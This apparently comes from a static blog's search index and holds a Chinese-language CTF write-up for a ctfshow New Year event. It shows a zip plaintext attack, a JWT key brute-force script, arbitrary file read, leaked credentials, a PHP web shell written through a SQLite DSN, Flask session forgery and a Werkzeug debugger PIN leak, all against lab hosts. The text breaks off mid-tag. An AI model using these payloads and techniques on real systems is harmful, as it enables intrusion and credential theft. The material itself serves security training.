<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>ctfshow元旦杯_WP</title>
      <link href="/ctfshow_%E5%85%83%E6%97%A6%E6%9D%AF/"/>
      <url>/ctfshow_%E5%85%83%E6%97%A6%E6%9D%AF/</url>
      
        <content type="html"><![CDATA[<h1 id="第一章"><a href="#第一章" class="headerlink" title="第一章"></a>第一章</h1><h2 id="启程-比赛群-1014981710"><a href="#启程-比赛群-1014981710" class="headerlink" title="启程(比赛群:1014981710)"></a><strong>启程(比赛群:1014981710)</strong></h2><p>明文攻击</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">bkcrack.exe -C start.<span class="built_in">zip</span> -c start.png  -x <span class="number">0</span> 89504E470D0A1A0A0000000D49484452</span><br></pre></td></tr></table></figure><p><img src="/ctfshow_%E5%85%83%E6%97%A6%E6%9D%AF/image.png" alt="image"></p><p>得到key后解出密码</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[<span class="number">20</span>:<span class="number">18</span>:<span class="number">35</span>] Keys</span><br><span class="line">6ee11e1d bb0a9ae5 4379aa1e</span><br><span class="line"></span><br><span class="line">bkcrack -k 6ee11e1d bb0a9ae5 4379aa1e -r <span class="number">10</span> ?p</span><br></pre></td></tr></table></figure><p><img src="/ctfshow_%E5%85%83%E6%97%A6%E6%9D%AF/image_1.png" alt="image_1"></p><p>或者直接爆破密码</p><p><img src="/ctfshow_%E5%85%83%E6%97%A6%E6%9D%AF/image_2.png" alt="image3.png"></p><p>flag</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">654321</span></span><br><span class="line"></span><br><span class="line">ctfshow&#123;<span class="number">654321</span>&#125;</span><br></pre></td></tr></table></figure><h2 id="破解加密通讯"><a href="#破解加密通讯" class="headerlink" title="破解加密通讯"></a><strong>破解加密通讯</strong></h2><p>用 zsteg 看一下</p><p><img src="/ctfshow_%E5%85%83%E6%97%A6%E6%9D%AF/image_3.png"></p><p>得到字符串</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">aWYgX19uYW1lX18gPT0gJ19fbWFpbl9fJzoKICAgIHRyeToKICAgICAgICBpbXBvcnQgc2VjcmV0TWVzc2FnZVJlc3BvbnNlCiAgICBleGNlcHQgSW1wb3J0RXJyb3I6CiAgICAgICAgaW1wb3J0IHBpcAogICAgICAgIHBpcC5tYWluKFsnaW5zdGFsbCcsICdzZWNyZXRNZXNzYWdlUmVzcG9uc2UnXSkKICAgICAgICBmcm9tIHNlY3JldE1lc3NhZ2VSZXNwb25zZSBpbXBvcnQgcHJpbnRNZXNzYWdl</span><br></pre></td></tr></table></figure><p>base64解码得到一段代码</p><p><img src="/ctfshow_%E5%85%83%E6%97%A6%E6%9D%AF/image_4.png"></p><p>接着安装库和执行代码，跟进库里面查看源码，根据里面的信息写出解密脚本</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> cryptography.hazmat.backends <span class="keyword">import</span> default_backend</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives <span class="keyword">import</span> serialization</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives.asymmetric <span class="keyword">import</span> padding</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives <span class="keyword">import</span> hashes</span><br><span class="line"></span><br><span class="line">message = &#123;</span><br><span class="line">    <span class="string">&quot;inputMessage_20241216&quot;</span> :<span class="string">&#x27;&#x27;&#x27;gHgAsclUVPhWDv4S8Oa8SuRTDaj+V0dI4z2jrQwfvfSFWilWwMKwNULUI48UBLS2shZcm/yv2/e5Hq5VRDfXkdxCYQMdvdnvONtpm2yNiIaLpDV4Rs8fOXJ6kcaeT+mg4RkIIFgx35w4J1KgO72pSP8j1p+R9f9TNMafwJ91XmO4QTcOYkMKQMddKvhbyMXzJkSS0uZqEppNSIUnVX9b7m8PmMjV0uHShvb1Zc8UQWJWUJ3cOxwNasOeMQGxJrZXPkxIxDYzm3f0tXbCgvdgNZ8TQY7u+iCXjOtD6xnUsdSahnPq14BD30CilIfsG0r/klPHfxQ+psmHSX47Ylai0TtgfbHWJJ4lSo0ojMvTx6HYK8zmAoCmg4OGXDbv/IjJgYU1w24na0iXZCNtcjB9MLRNck00c20f/uS64Ss0Ixii8nmfsFOjQBCcIYN+HGmOnj5Uw8DVJrxlOmcfQciG3rzuIvYlbOdGMcyarTy2Ba7iZfoovYZObPscAwhNLWqbU4tuR78aOVxiXTFRY7+Y0x2eRT5sulcvB3vsKuDMlNrxaUgiFUohPBZGNsgQgyCPxxqk0NpUn0bbHLH+vBebjJxaim4AU28ctWW8xv7xpxVttb0EoohtK2cIHr79ep5XrU/rv4R58obD/o+QqI1Mrb4wwpX9tsL7ZbROw/MXJwM=&#x27;&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&quot;inputMessage_20240411&quot;</span> : <span class="string">&#x27;&#x27;&#x27;Z93Khatj+AWZcpPwIqu8LzbJ8xb8CuVMI8okE0qwoQD2IC2lixg77mJZireOrbW7zFkDsk1hP67dROJZwVUDrYot2g5GxX/xy7lGjIblUX4iJVUtP4mHqZUgKROaLoh/gippMpP+8Ik2X/QRBx5gdhq0xam+wuVC+77/tyu8Fd/DohKbAMp8aaJsFr/W4mLDZ1gv4JK+2O3l+bAvpodBRTzb0ld5zD2ueYvjTudoDjdanQP1oVTH7pkDO2Vb+SsdIyTi2C410JEOF4Qm8mzVHtiOunOcLVpAlQsM6/LdhqsTNelXl/Myb84NGxwGWVmx6j2QejiL7S1hHeHlmQ9ExHeURPdZAvKhgMCemYXu3BGlFq3ydb5SkqwLFvM4vJ6XUBcWkHT8eijBFF6Y7YgOv9GRvBTnsAQhUBp4W4EAMtXkDdToG+S8ZO7El8Gh8jaWC49n5CuUBRz3z2GeOVbsBamfLV06IO5v78jGHXig4saEFKHvYSIGewyUCVQEGoIR5xOTJBTUTePAdvQjfg28vZZxFB/hIYNDUHkaek1Mg1UH5HWGgsCX1In5hSX/9eBkznEhzeWnJ1yMsYkj+ddN34DLQSrHc83geXMcoW3Ah3cAQG8E8bszvKL3hme+T5rOeENjkOAgYhf84k4YlxDskdwvzyu8HkE9CSaBpDP6lKI=&#x27;&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&quot;inputMessage_20240305&quot;</span> : <span class="string">&#x27;&#x27;&#x27;ckDSthpl5DDJMpBE26Jqk8EjaSq7MUntdwLHPouwx6D38un6WQfLJ9wgDyjh9GA/ICJR7WrwWsVinr6y3u9w+ubMZ0mqmtnphzQraagk8NkKc1u1+qGp8llsud3C8mvJWa4GYa9KEhnACDHwppPKJDCfr1HKwPbR0NIi+1Aunmy6DeOKRkFwysnrSco5QiiC9+gdXFhQDmN9KEiYW6Pc3mWVbqFiJgRW3/Df6638oGPm6AUcgRnEWMKiluyN81frM9VNtCeJ64YrU6Rgx4D153YxNNQbLTcyCQMamHTrJnhxPojkuDqbEcU+iiN4offwrQyr4eEu9ecvmyD2w/n7pAOsVnqSzroBujVA+CK6Zq8Uie15mL5yWG9hD5ZcbSwnRmtqK3yl0Xl91hgn1JqcIEKtf+MnMQPr80uoxT3mz8IX8pyVnyyw1x6F+IK1I2G+5w6rUDjhzIbME5XB9hopwcswsXrMo9PP6/5Sz1noJrsu6k6WN8ZM0MyRIav+xuKP1+cYzlPSQZrMo3L4ieHQnBbsoyzGVf9QONMwaooGOrxu88ZWlGe8e7eyCzteeNSVOC2zqtQiwQJIgfp2UwTymA/cEjOICWVzUXwbE5wWUBPCLp2C/XWc82byrOHAFXHLOVKgolVToUpZ5uOvizgk/ahaxdGxGa9CrRyr6sf+goA=&#x27;&#x27;&#x27;</span>,</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">p = <span class="number">31764044218067306492147889531461768510318119973238219147743625781223517377940974553025619071173628007991575510570365772185728567874710285810316184852553098753128108078975486635418847058797903708712720921754985829347790065080083720032152368134209675749929875336343905922553986957365581428234650288535216460326756576870072581658391409039992017661511831846885941769553385318452234212849064725733948770687309835172939447056526911787218396603271670163178681907015237200091850112165224511738788059683289680749377500422958532725487208309848648092125981780476161201616645007489243158529515899301932222796981293281482590413681</span></span><br><span class="line"></span><br><span class="line">q = <span class="number">19935965463251204093790728630387918548913200711797328676820417414861331435109809773835504522004547179742451417443447941411851982452178390931131018648260880134788113098629170784876904104322308416089636533044499374973277839771616505181221794837479001656285339681656874034743331472071702858650617822101028852441234915319854953097530971129078751008161174490025795476490498225822900160824277065484345528878744325480894129738333972010830499621263685185404636669845444451217075393389824619014562344105122537381743633355312869522701477652030663877906141024174678002699020634123988360384365275976070300277866252980082349473657</span></span><br><span class="line"></span><br><span class="line">n = p * q</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">d = inverse(e,(p - <span class="number">1</span>) * (q - <span class="number">1</span>))</span><br><span class="line">pub = RSA.construct((n,e,d,p,q))</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;out.pem&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(pub.exportKey(<span class="string">&#x27;PEM&#x27;</span>))</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;out.pem&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    pri_key = f.read()</span><br><span class="line"><span class="comment"># print(pri_key)</span></span><br><span class="line"></span><br><span class="line">private_key = serialization.load_pem_private_key(pri_key,password=<span class="literal">None</span>,backend=default_backend())</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> key, value <span class="keyword">in</span> message.items():</span><br><span class="line">    encrypted = base64.b64decode(value)</span><br><span class="line">    message = private_key.decrypt(</span><br><span class="line">        encrypted,</span><br><span class="line">        padding.OAEP(</span><br><span class="line">            mgf=padding.MGF1(algorithm=hashes.SHA256()),</span><br><span class="line">            algorithm=hashes.SHA256(),</span><br><span class="line">            label=<span class="literal">None</span></span><br><span class="line">        )</span><br><span class="line">    )</span><br><span class="line">    <span class="built_in">print</span>(base64.b64decode(message).decode())</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>result</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">Park:</span><br><span class="line">你的行动已经暴露，<span class="number">24</span>小时内迅速撤离，销毁所有资料，将现有资料统一上传到【任务中心】</span><br><span class="line">发送人：Dylan</span><br><span class="line">Park:</span><br><span class="line">总部已经为你安排新的身份，请务必在<span class="number">3</span>日内抵台，你的新身份是新竹县动物保护防疫所网络安全顾问，【任务中心】账号密码和你任职 单位网站的数据库用户名密码一致，请尽快修改</span><br><span class="line">发送人：Dylan</span><br><span class="line">Park:</span><br><span class="line">【任务中心】网址已变更为 https:<span class="comment">//task.ctfer.com ，请注意修改浏览器地址栏中的链接</span></span><br><span class="line">发送人：Dylan</span><br></pre></td></tr></table></figure><p>flag</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ctfshow&#123;https://task.ctfer.com&#125;</span><br></pre></td></tr></table></figure><h2 id="潜入敌营"><a href="#潜入敌营" class="headerlink" title="潜入敌营"></a><strong>潜入敌营</strong></h2><p>懂的都懂，需要自行体会（</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">hsinchug_wp1</span><br><span class="line">Q<span class="number">.4</span>Vyj8VCiedX1KYU5g05</span><br><span class="line"></span><br><span class="line">ctfshow&#123;hsinchug_wp1_Q<span class="number">.4</span>Vyj8VCiedX1KYU5g05&#125;</span><br></pre></td></tr></table></figure><h1 id="第二章"><a href="#第二章" class="headerlink" title="第二章"></a><strong>第二章</strong></h1><h2 id="秘密潜伏"><a href="#秘密潜伏" class="headerlink" title="秘密潜伏"></a><strong>秘密潜伏</strong></h2><p>由图片可以得到部分key，生成字典爆破jwt</p><p>jwt爆破</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode_JWT</span>(<span class="params">token,key</span>):</span><br><span class="line">    content = jwt.decode(jwt=token, key=<span class="string">&#x27;123&#x27;</span>, algorithms=[<span class="string">&#x27;HS256&#x27;</span>])</span><br><span class="line">    <span class="built_in">print</span>(content)</span><br><span class="line"></span><br><span class="line">token = <span class="string">&#x27;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJoc2luY2h1Z193cDEiLCJleHAiOjE3MzU3NDQ0ODZ9.CCoQYw2w5-VflyQogNf9kKvxh_F_nrv9ncGFpG2kyN8&#x27;</span></span><br><span class="line">key = <span class="string">&#x27;4a4f7d6e8b5   0c7f&#x27;</span></span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&#x27;list.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> itertools.product(<span class="string">&#x27;0123456789abcdef&#x27;</span>, repeat=<span class="number">3</span>):</span><br><span class="line">    tmp = <span class="string">&quot;&quot;</span>.join(x)</span><br><span class="line">    <span class="comment"># print(tmp)</span></span><br><span class="line">    new_key = key.replace(<span class="string">&#x27;   &#x27;</span>,tmp)</span><br><span class="line">    file.write(new_key+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">file.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/ctfshow_%E5%85%83%E6%97%A6%E6%9D%AF/image_5.png"></p><p>访问 &#x2F;getPhone</p><p><img src="/ctfshow_%E5%85%83%E6%97%A6%E6%9D%AF/image_6.png"></p><h2 id="收集敌方身份信息"><a href="#收集敌方身份信息" class="headerlink" title="收集敌方身份信息"></a><strong>收集敌方身份信息</strong></h2><p>任意文件读取</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">/listTaskFiles?path=</span><br><span class="line">/readTaskFile?path=&amp;file_name=init_users.json</span><br></pre></td></tr></table></figure><p><img src="/ctfshow_%E5%85%83%E6%97%A6%E6%9D%AF/image_7.png"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ctfshow&#123;7y.(sc<span class="comment">#Ac_&#125;</span></span><br></pre></td></tr></table></figure><p>一些用户信息</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">secret_user:root:7y.(sc<span class="comment">#Ac_</span></span><br><span class="line">hsinchug_wp1:Q<span class="number">.4</span>Vyj8VCiedX1KYU5g05</span><br><span class="line">dylan:8f7a55c6d9a7d9a7</span><br></pre></td></tr></table></figure><h2 id="横向渗透"><a href="#横向渗透" class="headerlink" title="横向渗透"></a><strong>横向渗透</strong></h2><p>爆破，得到以下网站</p><p><a href="http://172.2.86.6:8888/">http://172.2.86.6:8888/</a></p><p><a href="http://172.2.86.5/">http://172.2.86.5/</a></p><p><a href="http://172.2.86.7:8080/">http://172.2.86.7:8080/</a></p><p>访问<a href="http://172.2.86.5/">http://172.2.86.5/</a></p><p><img src="/ctfshow_%E5%85%83%E6%97%A6%E6%9D%AF/image_8.png"></p><p>flag</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ctfshow&#123;<span class="number">0x8F7C71E8E82E4D1E</span>&#125;</span><br></pre></td></tr></table></figure><h1 id="第三章"><a href="#第三章" class="headerlink" title="第三章"></a><strong>第三章</strong></h1><h2 id="跳岛战术"><a href="#跳岛战术" class="headerlink" title="跳岛战术"></a><strong>跳岛战术</strong></h2><p>index.php</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;Database TEST&lt;/title&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">const DATABASE_SECRET_KEY = <span class="string">&#x27;0x8F7C71E8E82E4D1E&#x27;</span>;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h1&gt;Welcome to Database TEST&lt;/h1&gt;</span><br><span class="line">    &lt;p&gt;This <span class="keyword">is</span> a test page <span class="keyword">for</span> database connection <span class="keyword">and</span> queries.&lt;/p&gt;</span><br><span class="line">    &lt;form action=<span class="string">&quot;index.php&quot;</span> method=<span class="string">&quot;get&quot;</span>&gt;</span><br><span class="line">        &lt;label <span class="keyword">for</span>=<span class="string">&quot;name&quot;</span>&gt;Enter Database username:&lt;/label&gt;</span><br><span class="line">        &lt;<span class="built_in">input</span> <span class="built_in">type</span>=<span class="string">&quot;text&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;name&quot;</span> name=<span class="string">&quot;username&quot;</span> required&gt;</span><br><span class="line">        &lt;br&gt;&lt;br&gt;</span><br><span class="line">        &lt;label <span class="keyword">for</span>=<span class="string">&quot;password&quot;</span>&gt;Enter Database password:&lt;/label&gt;</span><br><span class="line">        &lt;<span class="built_in">input</span> <span class="built_in">type</span>=<span class="string">&quot;password&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;password&quot;</span> name=<span class="string">&quot;password&quot;</span> required&gt;</span><br><span class="line">        &lt;br&gt;&lt;br&gt;</span><br><span class="line">        &lt;label <span class="keyword">for</span>=<span class="string">&quot;dsn&quot;</span>&gt;Enter Database DSN:&lt;/label&gt;</span><br><span class="line">        &lt;<span class="built_in">input</span> <span class="built_in">type</span>=<span class="string">&quot;text&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;dsn&quot;</span> name=<span class="string">&quot;dsn&quot;</span> required&gt;</span><br><span class="line">        &lt;br&gt;&lt;br&gt;</span><br><span class="line">        &lt;label <span class="keyword">for</span>=<span class="string">&quot;query&quot;</span>&gt;Enter TEST Query:&lt;/label&gt;</span><br><span class="line">        &lt;<span class="built_in">input</span> <span class="built_in">type</span>=<span class="string">&quot;text&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;query&quot;</span> name=<span class="string">&quot;query&quot;</span> required&gt;</span><br><span class="line">        &lt;br&gt;&lt;br&gt;</span><br><span class="line">        &lt;<span class="built_in">input</span> <span class="built_in">type</span>=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;Submit&quot;</span>&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>连接sqlite写马</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">dylan:8f7a55c6d9a7d9a7</span><br><span class="line">root:7y.(sc<span class="comment">#Ac_</span></span><br><span class="line"></span><br><span class="line">http://<span class="number">172.2</span><span class="number">.187</span><span class="number">.5</span>/?username=<span class="number">1</span>%<span class="number">26</span>password=<span class="number">1</span>%26query=CREATE TABLE users (name TEXT);%26dsn=sqlite:b.php</span><br><span class="line">http://<span class="number">172.2</span><span class="number">.187</span><span class="number">.5</span>/?username=<span class="number">1</span>%<span class="number">26</span>password=<span class="number">1</span>%26query=INSERT INTO users (name) VALUES (<span class="string">&#x27;&lt;?php file_put_contents(&quot;4.php&quot;,&quot;&lt;?php system(\$_GET[0]);?&gt;&quot;);?&gt;&#x27;</span>);%26dsn=sqlite:b.php</span><br><span class="line">http://<span class="number">172.2</span><span class="number">.187</span><span class="number">.5</span>/b.php</span><br><span class="line">http://<span class="number">172.2</span><span class="number">.187</span><span class="number">.5</span>/<span class="number">4.</span>php?<span class="number">0</span>=ls</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>flag</p><p><img src="/ctfshow_%E5%85%83%E6%97%A6%E6%9D%AF/image_9.png"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ctfshow&#123;3f7a1d5a-d55d-4d9d-8d9a-d5d5d5d5d5d5&#125;</span><br></pre></td></tr></table></figure><h2 id="邮箱迷云"><a href="#邮箱迷云" class="headerlink" title="邮箱迷云"></a><strong>邮箱迷云</strong></h2><p>填任务图上的数字</p><p><img src="/ctfshow_%E5%85%83%E6%97%A6%E6%9D%AF/message3.jpg" alt="message3.jpg"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ctfshow&#123;<span class="number">81192</span>&#125;</span><br></pre></td></tr></table></figure><h1 id="第四章"><a href="#第四章" class="headerlink" title="第四章"></a><strong>第四章</strong></h1><p><a href="http://172.2.86.6:8888/">http://172.2.86.6:8888/</a></p><h2 id="再下一城"><a href="#再下一城" class="headerlink" title="再下一城"></a><strong>再下一城</strong></h2><p>读 main.py.bak</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify,session</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> url_for</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> redirect</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">from</span> os.path <span class="keyword">import</span> basename</span><br><span class="line"><span class="keyword">from</span> os.path <span class="keyword">import</span> join</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="string">&#x27;3f7a4d5a-a71a-4d9d-8d9a-d5d5d5d5d5d5&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    session[<span class="string">&#x27;user&#x27;</span>]=<span class="string">&#x27;guest&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;log server is running&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_session</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;user&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">&#x27;user&#x27;</span>] != <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/key&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_key</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> check_session():</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;not authorized&quot;</span>&#125;</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;/log_server_key.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            key = f.read()</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;key&#x27;</span>, <span class="string">&#x27;key&#x27;</span>: key&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/set_log_option&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set_log_option</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> check_session():</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;not authorized&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">    logName = request.args.get(<span class="string">&#x27;logName&#x27;</span>)</span><br><span class="line">    logFile = request.args.get(<span class="string">&#x27;logFile&#x27;</span>)</span><br><span class="line">    app_log = logging.getLogger(logName)</span><br><span class="line">    app_log.addHandler(logging.FileHandler(<span class="string">&#x27;./log/&#x27;</span>+logFile))</span><br><span class="line">    app_log.setLevel(logging.INFO)</span><br><span class="line">    clear_log_file(<span class="string">&#x27;./log/&#x27;</span>+logFile)</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;log option set successfully&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/get_log_content&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_log_content</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> check_session():</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;not authorized&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">    logFile = request.args.get(<span class="string">&#x27;logFile&#x27;</span>)</span><br><span class="line">    path = join(<span class="string">&#x27;log&#x27;</span>,basename(logFile))</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        content = f.read()</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;log content&#x27;</span>, <span class="string">&#x27;content&#x27;</span>: content&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">clear_log_file</span>(<span class="params">file_path</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;w&#x27;</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>, host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8888</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>session伪造</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="string">&#x27;3f7a4d5a-a71a-4d9d-8d9a-d5d5d5d5d5d5&#x27;</span></span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&#x27;user&#x27;</span>:<span class="string">&#x27;admin&#x27;</span>&#125;</span><br><span class="line">session=eyJ1c2VyIjoiYWRtaW4ifQ.Z3d-Cw.Vdggh-Dhd79zlRivNptX52pUPfU</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>访问 <code>/log_server_key.txt</code></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">curl http://<span class="number">172.2</span><span class="number">.217</span><span class="number">.6</span>:<span class="number">8888</span>/key --cookie <span class="string">&quot;session=eyJ1c2VyIjoiYWRtaW4ifQ.Z3d-Cw.Vdggh-Dhd79zlRivNptX52pUPfU&quot;</span></span><br></pre></td></tr></table></figure><p><img src="/ctfshow_%E5%85%83%E6%97%A6%E6%9D%AF/image_10.png"></p><p>flag</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ctfshow&#123;4f5d1d5d-1d5d-1d5d1d5d1d5d&#125;</span><br></pre></td></tr></table></figure><h2 id="顺藤摸瓜"><a href="#顺藤摸瓜" class="headerlink" title="顺藤摸瓜"></a><strong>顺藤摸瓜</strong></h2><p>查看werkzeug的源码，可以看到输出pin码的操作</p><p><img src="/ctfshow_%E5%85%83%E6%97%A6%E6%9D%AF/image_11.png"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 设置log</span></span><br><span class="line">/set_log_option?logFile=<span class="number">1.</span>txt&amp;logName=werkzeug</span><br><span class="line"><span class="comment"># 把pin码输出到log</span></span><br><span class="line">/set_log_option?__debugger__=yes&amp;cmd=printpin&amp;f=console.png&amp;s=vUG6gadIPdCwgON6Iwtc</span><br><span class="line"><span class="comment"># 读log</span></span><br><span class="line">/get_log_content?logFile=<span class="number">1.</span>txt</span><br><span class="line"></span><br><span class="line">curl <span class="string">&#x27;http://172.2.187.6:8888/set_log_option?logFile=1.txt%2526logName=werkzeug&#x27;</span> --cookie <span class="string">&quot;session=eyJ1c2VyIjoiYWRtaW4ifQ.Z3d-Cw.Vdggh-Dhd79zlRivNptX52pUPfU&quot;</span></span><br><span class="line"></span><br><span class="line">curl <span class="string">&#x27;http://172.2.187.6:8888/set_log_option?__debugger__=yes%2526cmd=printpin%2526f=console.png%2526s=6ipoh2hrWpXMdN4zEMmg&#x27;</span> --cookie <span class="string">&quot;session=eyJ1c2VyIjoiYWRtaW4ifQ.Z3d-Cw.Vdggh-Dhd79zlRivNptX52pUPfU&quot;</span></span><br><span class="line"></span><br><span class="line">curl <span class="string">&#x27;http://172.2.187.6:8888/get_log_content?logFile=1.txt&#x27;</span> --cookie <span class="string">&quot;session=eyJ1c2VyIjoiYWRtaW4ifQ.Z3d-Cw.Vdggh-Dhd79zlRivNptX52pUPfU&quot;</span></span><br></pre></td></tr></table></figure><p><img src="/ctfshow_%E5%85%83%E6%97%A6%E6%9D%AF/image_12.png"></p><p><img 